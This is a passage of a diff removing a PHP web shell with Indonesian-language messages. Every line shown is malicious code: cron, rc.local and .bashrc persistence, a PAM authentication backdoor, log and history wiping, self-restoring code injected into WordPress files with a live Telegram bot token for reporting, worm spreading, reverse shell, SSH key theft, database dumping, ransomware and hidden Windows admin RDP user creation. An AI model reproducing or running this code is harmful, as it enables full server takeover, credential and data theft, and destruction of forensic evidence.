-        $cron = "*/5 * * * * php " . __FILE__ . " > /dev/null 2>&1";
-        @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
-        $results[] = "✅ Cron job installed";
-        if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
-            $rc = file_get_contents('/etc/rc.local');
-            $rc = str_replace('exit 0', '', $rc);
-            $rc .= "\nphp " . __FILE__ . " --daemon &\nexit 0\n";
-            @file_put_contents('/etc/rc.local', $rc);
-            @chmod('/etc/rc.local', 0755);
-            $results[] = "✅ rc.local updated";
-        }
-    }
-    $msg = "💀 *Deep Persistence*\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => implode("\n", $results)];
-}
-
-function remove_deep_persistence() {
-    global $botToken, $telegramUserId;
-    @shell_exec('systemctl stop dkd.service 2>/dev/null');
-    @shell_exec('systemctl disable dkd.service 2>/dev/null');
-    @unlink('/etc/systemd/system/dkd.service');
-    @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
-    if (file_exists('/etc/rc.local') && is_writable('/etc/rc.local')) {
-        $rc = file_get_contents('/etc/rc.local');
-        $rc = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $rc);
-        $rc = preg_replace('/--daemon.*\n/', '', $rc);
-        @file_put_contents('/etc/rc.local', $rc);
-    }
-    $msg = "✅ Deep persistence removed";
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => $msg];
-}
-
-// ==================== PAM BYPASS ====================
-function pam_bypass_install($password = 'BackdoorPass123') {
-    global $botToken, $telegramUserId;
-    if (!isRoot()) return ['success' => false, 'msg' => "❌ Harus root"];
-    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/system-auth'];
-    $modified = [];
-    foreach ($pam_files as $file) {
-        if (file_exists($file) && is_writable($file)) {
-            $content = file_get_contents($file);
-            $lines = explode("\n", $content);
-            $new_lines = [];
-            $found = false;
-            foreach ($lines as $line) {
-                if (strpos($line, 'pam_unix.so') !== false && strpos($line, 'sufficient') === false && strpos($line, '#') !== 0) {
-                    $new_lines[] = "auth sufficient pam_permit.so # DKD_BACKDOOR";
-                    $found = true;
-                }
-                $new_lines[] = $line;
-            }
-            if ($found) {
-                @file_put_contents($file, implode("\n", $new_lines));
-                $modified[] = $file;
-            }
-        }
-    }
-    if (empty($modified)) return ['success' => false, 'msg' => "❌ Tidak ada file PAM yang dimodifikasi"];
-    $msg = "🔑 *PAM Bypass*\nPassword: $password\nModified: " . implode(', ', $modified);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => "✅ PAM bypass installed\nPassword: $password"];
-}
-
-function pam_bypass_remove() {
-    global $botToken, $telegramUserId;
-    $pam_files = ['/etc/pam.d/common-auth', '/etc/pam.d/sshd', '/etc/pam.d/login', '/etc/pam.d/system-auth'];
-    foreach ($pam_files as $file) {
-        if (file_exists($file) && is_writable($file)) {
-            $content = file_get_contents($file);
-            $content = preg_replace('/auth sufficient pam_permit\.so # DKD_BACKDOOR\n/', '', $content);
-            @file_put_contents($file, $content);
-        }
-    }
-    $msg = "✅ PAM bypass removed";
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => $msg];
-}
-
-// ==================== USER PERSISTENCE ====================
-function user_persistence_install() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    $home = getenv('HOME') ?: __DIR__;
-    $bashrc = $home . '/.bashrc';
-    if (file_exists($bashrc) && is_writable($bashrc)) {
-        $content = file_get_contents($bashrc);
-        $content .= "\n# DKD Persistence\nphp " . __FILE__ . " > /dev/null 2>&1 &\n";
-        @file_put_contents($bashrc, $content);
-        $results[] = "✅ .bashrc updated";
-    }
-    $profile = $home . '/.profile';
-    if (file_exists($profile) && is_writable($profile)) {
-        $content = file_get_contents($profile);
-        $content .= "\n# DKD Persistence\nphp " . __FILE__ . " > /dev/null 2>&1 &\n";
-        @file_put_contents($profile, $content);
-        $results[] = "✅ .profile updated";
-    }
-    $cron = "*/10 * * * * php " . __FILE__ . " > /dev/null 2>&1";
-    @shell_exec('(crontab -l 2>/dev/null; echo "' . $cron . '") | crontab -');
-    $results[] = "✅ User cron installed";
-    $msg = "💀 *User Persistence*\n\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => implode("\n", $results)];
-}
-
-function user_persistence_remove() {
-    global $botToken, $telegramUserId;
-    $home = getenv('HOME') ?: __DIR__;
-    $bashrc = $home . '/.bashrc';
-    if (file_exists($bashrc) && is_writable($bashrc)) {
-        $content = file_get_contents($bashrc);
-        $content = preg_replace('/# DKD Persistence.*\n/', '', $content);
-        $content = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $content);
-        @file_put_contents($bashrc, $content);
-    }
-    $profile = $home . '/.profile';
-    if (file_exists($profile) && is_writable($profile)) {
-        $content = file_get_contents($profile);
-        $content = preg_replace('/# DKD Persistence.*\n/', '', $content);
-        $content = preg_replace('/php ' . preg_quote(__FILE__, '/') . '.*\n/', '', $content);
-        @file_put_contents($profile, $content);
-    }
-    @shell_exec('crontab -l 2>/dev/null | grep -v "' . __FILE__ . '" | crontab -');
-    $msg = "✅ User persistence removed";
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return ['success' => true, 'msg' => $msg];
-}
-
-// ==================== LIST SPREAD FILES ====================
-function list_spread_files() {
-    global $botToken, $telegramUserId;
-    $found = [];
-    $myFile = basename(__FILE__);
-    $roots = get_all_document_roots_cached();
-    foreach ($roots as $root) {
-        $path = $root . '/' . $myFile;
-        if (file_exists($path)) { $found[] = $path; }
-    }
-    if (empty($found)) { 
-        sendTelegramMessage($botToken, $telegramUserId, "❌ Tidak ada file spread ditemukan."); 
-        return []; 
-    }
-    $msg = "📋 *Spread Files*\n\n" . implode("\n", $found);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $found;
-}
-
-// ==================== CLEAR LOGS ADVANCED ====================
-function clean_logs_advanced() {
-    global $botToken, $telegramUserId;
-    $logs = [
-        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
-        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
-        '/var/log/httpd/access_log', '/var/log/httpd/error_log',
-        '/var/log/syslog', '/var/log/auth.log', '/var/log/secure',
-        '/var/log/messages', '/var/log/mysql/error.log'
-    ];
-    $count = 0;
-    foreach ($logs as $log) {
-        if (file_exists($log) && is_writable($log)) {
-            @file_put_contents($log, '');
-            $count++;
-        }
-    }
-    if (function_exists('shell_exec')) {
-        @shell_exec('history -c 2>/dev/null');
-        @shell_exec('unset HISTFILE 2>/dev/null');
-    }
-    $msg = "✅ Logs cleaned ($count files) + history cleared";
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return $msg;
-}
-
-// ==================== ONE CLICK ALL ====================
-function one_click_all() {
-    global $botToken, $telegramUserId;
-    $results = [];
-    $start_time = microtime(true);
-    
-    // Spoof IP
-    $fake_ips = ['192.168.1.' . rand(1,254), '10.0.0.' . rand(1,254), '172.16.' . rand(0,31) . '.' . rand(1,254)];
-    $_SERVER['REMOTE_ADDR'] = $fake_ips[array_rand($fake_ips)];
-    $results[] = "✅ IP Spoofed: " . $_SERVER['REMOTE_ADDR'];
-    
-    // Clear Logs
-    $logs = ['/var/log/apache2/access.log', '/var/log/apache2/error.log', '/var/log/nginx/access.log', '/var/log/nginx/error.log', '/var/log/httpd/access_log', '/var/log/httpd/error_log', '/var/log/syslog', '/var/log/auth.log', '/var/log/secure'];
-    $cleared = 0;
-    foreach ($logs as $log) {
-        if (file_exists($log) && is_writable($log)) {
-            @file_put_contents($log, '');
-            $cleared++;
-        }
-    }
-    $results[] = "✅ Logs Cleared: $cleared files";
-    
-    // Clear History
-    if (function_exists('shell_exec')) {
-        @shell_exec('history -c 2>/dev/null');
-        @shell_exec('unset HISTFILE 2>/dev/null');
-        $results[] = "✅ History Cleared";
-    }
-    
-    // Delete Temp
-    $deleted_temp = 0;
-    foreach (['/tmp/', '/var/tmp/'] as $dir) {
-        if (is_dir($dir)) {
-            $files = @glob($dir . '*.tmp');
-            if ($files !== false) {
-                foreach ($files as $file) { if (@unlink($file)) $deleted_temp++; }
-            }
-        }
-    }
-    $results[] = "✅ Temp Files Deleted: $deleted_temp";
-    
-    // Clear System Cache
-    if (function_exists('shell_exec')) {
-        @shell_exec('sync 2>/dev/null');
-        @shell_exec('echo 3 > /proc/sys/vm/drop_caches 2>/dev/null');
-        $results[] = "✅ System cache dropped";
-    }
-    
-    $execution_time = round(microtime(true) - $start_time, 2);
-    $results[] = "⏱️ Execution time: $execution_time seconds";
-    
-    $msg = "💀 *ONE CLICK ALL COMPLETED*\n\n"
-         . "Total actions: " . count($results) . "\n\n"
-         . "📋 Details:\n" . implode("\n", $results);
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    
-    session_destroy();
-    exit;
-}
-
-// ==================== INJECT RESTORE (MENGIKUTI NAMA FILE) =====
-if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    global $CURRENT_SHELL;
-    
-    $targetFiles = [
-        __DIR__ . '/index.php',
-        __DIR__ . '/wp-login.php',
-        __DIR__ . '/wp-config.php',
-        __DIR__ . '/config.php',
-        __DIR__ . '/wp-load.php',
-        __DIR__ . '/settings.php'
-    ];
-    
-    $restoreCode = '
-if (!function_exists("dkd_restore_' . md5($CURRENT_SHELL) . '")) {
-    function dkd_restore_' . md5($CURRENT_SHELL) . '() {
-        $current_file = "' . $CURRENT_SHELL . '";
-        if (!file_exists(__DIR__ . "/" . $current_file)) {
-            $backup_locations = [
-                "/tmp/" . md5($current_file) . ".inc",
-                "/var/tmp/" . md5($current_file) . ".inc",
-                "/dev/shm/" . md5($current_file) . ".inc",
-                __DIR__ . "/.cache/" . $current_file . ".inc"
-            ];
-            foreach ($backup_locations as $backup) {
-                if (file_exists($backup)) {
-                    @copy($backup, __DIR__ . "/" . $current_file);
-                    @chmod(__DIR__ . "/" . $current_file, 0644);
-                    $domain = $_SERVER["HTTP_HOST"] ?? "localhost";
-                    $protocol = (isset($_SERVER["HTTPS"]) ? "https://" : "http://");
-                    $url = $protocol . $domain . "/" . $current_file;
-                    @file_get_contents("https://api.telegram.org/bot8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4/sendMessage?chat_id=7547598395&text=" . urlencode("🔄 RESTORED: " . $url));
-                    break;
-                }
-            }
-        }
-        $backup = "/tmp/" . md5($current_file) . ".inc";
-        if (!file_exists($backup) && file_exists(__DIR__ . "/" . $current_file)) {
-            @copy(__DIR__ . "/" . $current_file, $backup);
-            @chmod($backup, 0444);
-        }
-    }
-    dkd_restore_' . md5($CURRENT_SHELL) . '();
-}
-// ===== DKD AUTO RESTORE END =====
-';
-    
-    $injected = [];
-    $errors = [];
-    
-    foreach ($targetFiles as $file) {
-        if (file_exists($file) && is_writable($file)) {
-            $content = file_get_contents($file);
-            if (strpos($content, 'DKD AUTO RESTORE') === false) {
-                if (strpos($content, '<?php') === 0) {
-                    $newContent = '<?php' . "\n" . $restoreCode . "\n" . substr($content, 5);
-                } else {
-                    $newContent = '<?php' . "\n" . $restoreCode . "\n" . $content;
-                }
-                if (file_put_contents($file, $newContent)) {
-                    $injected[] = basename($file);
-                } else {
-                    $errors[] = basename($file) . " (gagal tulis)";
-                }
-            } else {
-                $injected[] = basename($file) . " (sudah ada)";
-            }
-        } else {
-            $errors[] = basename($file) . " (tidak ditemukan/tidak writable)";
-        }
-    }
-    
-    $backup = '/tmp/' . md5($CURRENT_SHELL) . '.inc';
-    if (!file_exists($backup)) {
-        @copy(__FILE__, $backup);
-        @chmod($backup, 0444);
-    }
-    
-    $msg = "🔧 *Inject Restore Code*\n"
-         . "📁 Shell: " . $CURRENT_SHELL . "\n"
-         . "✅ Berhasil: " . implode(", ", $injected) . "\n";
-    if (!empty($errors)) {
-        $msg .= "❌ Gagal: " . implode(", ", $errors) . "\n";
-    }
-    
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    
-    echo "✅ Inject selesai!\n";
-    echo "📁 Shell: " . $CURRENT_SHELL . "\n";
-    echo "📁 " . implode("\n📁 ", $injected);
-    if (!empty($errors)) {
-        echo "\n❌ " . implode("\n❌ ", $errors);
-    }
-    exit;
-}
-
-// ===== HAPUS SEMUA BACKUP =====
-if (isset($_GET['delete_backup']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
-        $deleted = [];
-        $errors = [];
-        
-        function delete_force($path) {
-            if (!file_exists($path)) return false;
-            @chmod($path, 0777);
-            if (is_file($path)) {
-                if (@unlink($path)) return true;
-                if (function_exists('shell_exec')) {
-                    @shell_exec("chmod 777 " . escapeshellarg($path) . " 2>/dev/null");
-                    @shell_exec("rm -f " . escapeshellarg($path) . " 2>/dev/null");
-                    return !file_exists($path);
-                }
-                return false;
-            }
-            if (is_dir($path)) {
-                if (function_exists('shell_exec')) {
-                    @shell_exec("chmod -R 777 " . escapeshellarg($path) . " 2>/dev/null");
-                    @shell_exec("rm -rf " . escapeshellarg($path) . " 2>/dev/null");
-                    return !is_dir($path);
-                }
-                return false;
-            }
-            return false;
-        }
-        
-        // Hapus di /tmp
-        $tmp_patterns = ['/tmp/*.inc', '/tmp/*.bak', '/tmp/*.tmp', '/tmp/backup_*', '/var/tmp/*.inc', '/dev/shm/*.inc'];
-        foreach ($tmp_patterns as $pattern) {
-            $files = @glob($pattern);
-            if ($files !== false) {
-                foreach ($files as $file) {
-                    if (delete_force($file)) $deleted[] = $file;
-                }
-            }
-        }
-        
-        // Hapus di .cache (tanpa root)
-        $safe_dirs = ['/home', '/var', '/usr', '/opt', '/srv'];
-        $all_cache = [];
-        foreach ($safe_dirs as $dir) {
-            if (is_dir($dir) && is_readable($dir)) {
-                $all_cache = array_merge($all_cache, scan_cache_dirs_safe($dir));
-            }
-        }
-        
-        foreach ($all_cache as $cache_dir) {
-            if (strpos($cache_dir, '/root/') !== false || $cache_dir == '/.cache') continue;
-            @chmod($cache_dir, 0777);
-            $patterns = [$cache_dir . '/*.inc', $cache_dir . '/*.bak', $cache_dir . '/*.tmp'];
-            foreach ($patterns as $pattern) {
-                $files = @glob($pattern);
-                if ($files !== false) {
-                    foreach ($files as $file) {
-                        if (delete_force($file)) $deleted[] = $file;
-                    }
-                }
-            }
-            $files = @scandir($cache_dir);
-            if ($files !== false && count($files) <= 2) {
-                if (delete_force($cache_dir)) $deleted[] = $cache_dir . '/ (directory removed)';
-            }
-        }
-        
-        // Hapus .cache di root jika ada
-        $root_cache = '/.cache';
-        if (is_dir($root_cache)) {
-            $files = @glob($root_cache . '/*');
-            if ($files !== false) {
-                foreach ($files as $file) {
-                    if (delete_force($file)) $deleted[] = $file;
-                }
-            }
-            $files = @scandir($root_cache);
-            if ($files !== false && count($files) <= 2) {
-                if (delete_force($root_cache)) $deleted[] = $root_cache . '/ (root cache removed)';
-            }
-        }
-        
-        $msg = "🗑️ *Backup Deleted*\n\n";
-        if (!empty($deleted)) {
-            $msg .= "✅ Total dihapus: " . count($deleted) . "\n\n";
-            $msg .= "📁 " . implode("\n📁 ", array_slice($deleted, 0, 20));
-            if (count($deleted) > 20) {
-                $msg .= "\n... dan " . (count($deleted) - 20) . " lainnya";
-            }
-        } else {
-            $msg .= "❌ Tidak ada backup ditemukan.";
-        }
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        echo "✅ " . count($deleted) . " backup files deleted!\n";
-    } else {
-        echo "⚠️ Confirm with: ?delete_backup=1&confirm=yes";
-    }
-    exit;
-}
-
-// ==================== BACKUP FUNCTION ====================
-function backup_this_file() {
-    global $botToken, $telegramUserId, $CURRENT_SHELL;
-    
-    $current_file = __FILE__;
-    $backup_dir = '/tmp/backup_' . date('Ymd_His');
-    
-    if (!is_dir($backup_dir)) {
-        @mkdir($backup_dir, 0755, true);
-    }
-    
-    $backup_file = $backup_dir . '/' . $CURRENT_SHELL . '.bak';
-    
-    if (@copy($current_file, $backup_file)) {
-        @chmod($backup_file, 0644);
-        
-        $zip_file = $backup_dir . '/backup.zip';
-        if (class_exists('ZipArchive')) {
-            $zip = new ZipArchive();
-            if ($zip->open($zip_file, ZipArchive::CREATE) === true) {
-                $zip->addFile($backup_file, $CURRENT_SHELL);
-                $zip->close();
-                @unlink($backup_file);
-                $backup_file = $zip_file;
-            }
-        }
-        
-        $file_info = get_file_location();
-        $msg = "💾 *BACKUP CREATED*\n\n"
-             . "📁 File: " . $CURRENT_SHELL . "\n"
-             . "📂 Location: " . $backup_file . "\n"
-             . "📦 Size: " . formatSize(filesize($backup_file)) . "\n"
-             . "🕐 Time: " . date('Y-m-d H:i:s') . "\n"
-             . "🔗 URL: " . $file_info['url'];
-        
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return ['success' => true, 'file' => $backup_file];
-    } else {
-        $msg = "❌ *BACKUP FAILED*\n\n"
-             . "📁 File: " . $CURRENT_SHELL . "\n"
-             . "🕐 Time: " . date('Y-m-d H:i:s');
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return ['success' => false, 'error' => 'Gagal membuat backup'];
-    }
-}
-
-// ==================== HANDLER GET =====
-if (isset($_GET['backup']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = backup_this_file();
-    if ($result['success']) {
-        echo "✅ Backup berhasil dibuat: " . $result['file'];
-    } else {
-        echo "❌ Backup gagal: " . $result['error'];
-    }
-    exit;
-}
-
-// ===== WORM HANDLERS =====
-if (isset($_GET['worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    worm_spread_to_domains(__FILE__);
-    echo "🪱 Worm spread executed. Check Telegram.";
-    exit;
-}
-
-if (isset($_GET['worm_infect_all']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = worm_infect_all_domains(__FILE__);
-    echo "🪱 Worm infect all domains selesai. " . count($result['infected']) . " direktori terinfeksi. Check Telegram.";
-    exit;
-}
-
-// ===== CLEAN HANDLER =====
-if (isset($_GET['clean']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    clean_traces();
-    echo "🧹 Traces cleaned. Check Telegram.";
-    exit;
-}
-
-// ===== BACKDOOR USER =====
-if (isset($_GET['backdooruser']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $user = $_GET['user'] ?? '';
-    $pass = $_GET['pass'] ?? '';
-    echo create_backdoor_user($user, $pass);
-    exit;
-}
-
-// ===== REVERSE SHELL =====
-if (isset($_GET['reverseshell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $action = $_GET['action'] ?? '';
-    $ip = $_GET['ip'] ?? '';
-    $port = $_GET['port'] ?? '';
-    if ($action == 'start') { start_reverse_shell($ip, $port); echo "✅ Reverse shell started."; }
-    elseif ($action == 'stop') echo stop_reverse_shell($port);
-    elseif ($action == 'status') echo status_reverse_shell();
-    exit;
-}
-
-// ===== SSH KEYS =====
-if (isset($_GET['sshkeys']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    grab_ssh_keys();
-    echo "🔑 SSH keys grabbed. Check Telegram.";
-    exit;
-}
-
-// ===== WP SCAN =====
-if (isset($_GET['wpscan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    scan_wordpress_laravel();
-    echo "📊 WP Scan executed. Check Telegram.";
-    exit;
-}
-
-// ===== RANSOMWARE =====
-if (isset($_GET['create_ransom']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    create_ransomware();
-    echo "💀 Ransomware created. Check Telegram.";
-    exit;
-}
-
-// ===== CONFIG FINDER =====
-if (isset($_GET['configfinder']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    find_sensitive_files();
-    echo "🔍 Config finder executed. Check Telegram.";
-    exit;
-}
-
-// ===== DUMP DB =====
-if (isset($_GET['dumpdb']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    dump_databases();
-    echo "💾 Database dump executed. Check Telegram.";
-    exit;
-}
-
-// ===== ANTI FORENSIC =====
-if (isset($_GET['anti_forensic']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = anti_forensic_ultimate();
-    echo $result['msg'];
-    exit;
-}
-
-// ===== BYPASS SUHOSIN =====
-if (isset($_GET['bypass_suhosin']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = bypass_suhosin();
-    echo $result['msg'];
-    exit;
-}
-
-// ===== CREATE FTP =====
-if (isset($_GET['create_ftp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $user = $_GET['user'] ?? 'ftpuser';
-    $pass = $_GET['pass'] ?? 'password123';
-    $home = $_GET['home'] ?? '/home/' . $user;
-    $result = create_ftp_account($user, $pass, $home);
-    echo $result['msg'];
-    exit;
-}
-
-// ===== CREATE MAIL =====
-if (isset($_GET['create_mail']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $email = $_GET['email'] ?? 'user@' . $_SERVER['HTTP_HOST'];
-    $pass = $_GET['pass'] ?? 'password123';
-    $domain = $_GET['domain'] ?? $_SERVER['HTTP_HOST'];
-    $result = create_mail_account($email, $pass, $domain);
-    echo $result['msg'];
-    exit;
-}
-
-// ===== CREATE RDP USER =====
-function create_rdp_user($username, $password) {
-    global $botToken, $telegramUserId;
-    $results = [];
-    
-    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
-        $msg = "❌ Server bukan Windows! OS: " . PHP_OS;
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    }
-    if (!function_exists('shell_exec')) {
-        $msg = "❌ shell_exec tidak tersedia!";
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    }
-    $check = shell_exec("net user " . escapeshellarg($username) . " 2>&1");
-    if (strpos($check, 'User name') !== false) {
-        $msg = "⚠️ User '$username' sudah ada!";
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    }
-    
-    $u = escapeshellarg($username);
-    $p = escapeshellarg($password);
-    $cmd = "net user $u $p /add 2>&1";
-    $output = shell_exec($cmd);
-    $results[] = "📌 Add user: " . trim($output);
-    
-    if (strpos($output, 'completed successfully') !== false || strpos($output, 'berhasil') !== false) {
-        shell_exec("net localgroup Administrators $u /add 2>&1");
-        shell_exec("net localgroup \"Remote Desktop Users\" $u /add 2>&1");
-        shell_exec("net user $u /active:yes 2>&1");
-        $rdp_status = shell_exec("sc query TermService | findstr STATE 2>&1");
-        if (strpos($rdp_status, 'STOPPED') !== false) {
-            shell_exec("sc start TermService 2>&1");
-        }
-        $msg = "✅ *RDP USER CREATED SUCCESSFULLY!*\n\n"
-             . "👤 Username: `$username`\n"
-             . "🔐 Password: `$password`\n"
-             . "🖥️ Host: " . gethostname() . "\n"
-             . "🌐 IP: " . (shell_exec('curl -s ifconfig.me 2>&1') ?: $_SERVER['SERVER_ADDR'] ?? 'unknown');
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    } else {
-        $msg = "❌ GAGAL BUAT USER! Cek password (min 8 karakter, kompleks) atau hak akses.";
-        sendTelegramMessage($botToken, $telegramUserId, $msg);
-        return $msg;
-    }
-}
-
-if (isset($_GET['create_rdp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $user = $_GET['user'] ?? 'rdp_' . rand(1000,9999);
-    $pass = $_GET['pass'] ?? 'P@ssw0rd' . rand(1000,9999) . '!';
-    echo create_rdp_user($user, $pass);
-    exit;
-}
-
-// ===== DEEP PERSISTENCE =====
-if (isset($_GET['deep_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $action = $_GET['deep_persistence'];
-    $result = $action === 'install' ? install_deep_persistence() : remove_deep_persistence();
-    echo $result['msg'];
-    exit;
-}
-
-// ===== PAM BYPASS =====
-if (isset($_GET['pam_bypass']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $action = $_GET['pam_bypass'];
-    $password = $_GET['password'] ?? 'BackdoorPass123';
-    $result = $action === 'install' ? pam_bypass_install($password) : pam_bypass_remove();
-    echo $result['msg'];
-    exit;
-}
-
-// ===== USER PERSISTENCE =====
-if (isset($_GET['user_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $action = $_GET['user_persistence'];
-    $result = $action === 'install' ? user_persistence_install() : user_persistence_remove();
-    echo $result['msg'];
-    exit;
-}
-
-// ===== LIST SPREAD =====
-if (isset($_GET['list_spread']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    list_spread_files();
-    echo "📋 List spread files sent to Telegram.";
-    exit;
-}
-
-// ===== CLEAR LOGS =====
-if (isset($_GET['clearlogs']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    echo clean_logs_advanced();
-    exit;
-}
-
-// ===== ONE CLICK =====
-if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    if (isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
-        one_click_all();
-    } else {
-        echo "⚠️ ONE CLICK requires confirmation: ?one_click=1&confirm=yes";
-    }
-    exit;
-}
-
-// ===== LOGIN OTP =====
-$loginError = $loginSuccess = '';
-
-if (isset($_POST['request_otp'])) {
-    $otp = sprintf("%06d", mt_rand(0, 999999));
-    $_SESSION['otp'] = $otp;
-    $_SESSION['otp_time'] = time();
-    $message = "🔑 <b>Kode OTP Anda:</b>\n\n<code>$otp</code>\n\n⏱️ Berlaku 5 menit.";
-    $sent = sendTelegramMessage($botToken, $telegramUserId, $message);
-    if ($sent) $loginSuccess = "✅ OTP telah dikirim ke Telegram.";
-    else { $loginError = "❌ Gagal mengirim OTP."; unset($_SESSION['otp']); }
-}
-
-if (isset($_POST['verify_otp'])) {
-    $inputOtp = trim($_POST['otp'] ?? '');
-    if (empty($inputOtp)) $loginError = "Masukkan kode OTP.";
-    elseif (!isset($_SESSION['otp']) || !isset($_SESSION['otp_time'])) $loginError = "Minta OTP dulu.";
-    elseif (time() - $_SESSION['otp_time'] > 300) {
-        $loginError = "❌ Kode kadaluarsa.";
-        unset($_SESSION['otp'], $_SESSION['otp_time']);
-    } elseif ($inputOtp === $_SESSION['otp']) {
-        $_SESSION['loggedin'] = true;
-        $_SESSION['login_time'] = time();
-        unset($_SESSION['otp'], $_SESSION['otp_time']);
-        header('Location: ?');
-        exit;
-    } else $loginError = "❌ Kode OTP salah.";
-}
-
-// ===== AREA LOGGED IN =====
-if (isset($_SESSION['loggedin'])) {
-    if (time() - $_SESSION['login_time'] > 1800) {
-        session_destroy();
-        header('Location: ?');
-        exit;
-    }
-    
-    $currentPath = $rootPath;
-    if (isset($_GET['path'])) {
-        $requestedPath = realpath($_GET['path']);
-        if ($requestedPath && isSafePath($requestedPath, $rootPath, $specialDirectories)) {
-            $currentPath = $requestedPath;
-        } else {
-            $error = "Path tidak valid";
-        }
-    }
-    if (!file_exists($currentPath) || !is_dir($currentPath) || !is_readable($currentPath)) {
-        $error = "Direktori tidak dapat diakses";
-        $currentPath = $rootPath;
-    }
-    
-    // ===== HANDLER POST =====
-    if (isset($_POST['create']) && isset($_POST['type']) && isset($_POST['name'])) {
-        try {
-            $type = $_POST['type'];
-            $name = trim($_POST['name']);
-            if (empty($name)) throw new Exception('Nama tidak boleh kosong');
-            if (preg_match('/[\/\\\\:\*\?"<>\|]/', $name)) throw new Exception('Nama mengandung karakter tidak valid');
-            $newPath = $currentPath . DIRECTORY_SEPARATOR . $name;
-            if (file_exists($newPath)) throw new Exception('File/folder sudah ada: ' . $name);
-            if ($type === 'file') {
-                if (@touch($newPath)) { @chmod($newPath, 0644); $success = '✅ File berhasil dibuat: ' . $name; }
-                else { throw new Exception('Gagal membuat file: ' . $name); }
-            } elseif ($type === 'folder') {
-                if (@mkdir($newPath, 0755, true)) { $success = '✅ Folder berhasil dibuat: ' . $name; }
-                else { throw new Exception('Gagal membuat folder: ' . $name); }
-            } else { throw new Exception('Tipe tidak valid'); }
-            header('Location: ?path=' . urlencode($currentPath));
-            exit;
-        } catch (Exception $e) { $error = $e->getMessage(); }
-    }
-    
-    if (isset($_FILES['upload']) && !empty($_FILES['upload']['name'][0])) {
-        try {
-            if (!is_writable($currentPath)) throw new Exception('Direktori tidak dapat ditulisi');
-            $mode = $_POST['upload_mode'] ?? 'normal';
-            $targetDirs = [$currentPath];
-            if ($mode === 'bulk_shallow') $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath));
-            elseif ($mode === 'bulk_deep') $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath));
-            $targetDirs = array_filter($targetDirs, 'is_writable');
-            $uploadedFiles = [];
-            $errors = [];
-            $fileCount = count($_FILES['upload']['name']);
-            for ($i = 0; $i < $fileCount; $i++) {
-                if ($_FILES['upload']['error'][$i] !== UPLOAD_ERR_OK) { $errors[] = "Error upload file " . ($i+1); continue; }
-                $safeName = basename($_FILES['upload']['name'][$i]);
-                $mainTarget = $currentPath . DIRECTORY_SEPARATOR . $safeName;
-                if (file_exists($mainTarget)) { $errors[] = "File sudah ada: $safeName"; continue; }
-                if (@move_uploaded_file($_FILES['upload']['tmp_name'][$i], $mainTarget)) {
-                    @chmod($mainTarget, 0644);
